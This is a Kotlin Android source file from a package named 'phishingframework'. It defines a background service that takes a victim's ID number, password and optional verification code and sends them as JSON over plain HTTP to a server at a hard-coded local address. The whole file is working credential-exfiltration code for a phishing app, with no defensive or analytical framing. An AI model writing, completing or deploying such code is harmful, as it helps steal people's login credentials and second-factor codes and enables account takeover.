package com.example.phishingframework

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class CredentialSendService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val idNumber = intent?.getStringExtra("id") ?: return START_NOT_STICKY
        val password = intent.getStringExtra("password") ?: return START_NOT_STICKY
        val codeValue = intent.getStringExtra("code") ?: ""

        serviceScope.launch {
            sendCredentials(idNumber, password, codeValue)
        }

        // נעצור את השירות בעצמנו לאחר הסיום
        return START_NOT_STICKY
    }

    private fun sendCredentials(idNumber: String, password: String, codeValue: String) {
        val json = if (codeValue.isNotEmpty()) {
            """
                {
                  "id": "$idNumber",
                  "password": "$password",
                  "code": "$codeValue" 
                }
            """.trimIndent()
        } else {
            """
                {
                  "id": "$idNumber",
                  "password": "$password"
                }
            """.trimIndent()
        }

        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val body = json.toRequestBody(mediaType)
        val request = Request.Builder()
            .url("http://192.168.1.28:5000/api/credentials")
            .post(body)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("CredentialSendService", "Failed to send credentials", e)
                stopSelf()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("CredentialSendService", "Credentials sent successfully")
                } else {
                    Log.w("CredentialSendService", "Server error: ${response.code}")
                }
                response.close()
                stopSelf()
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }
}
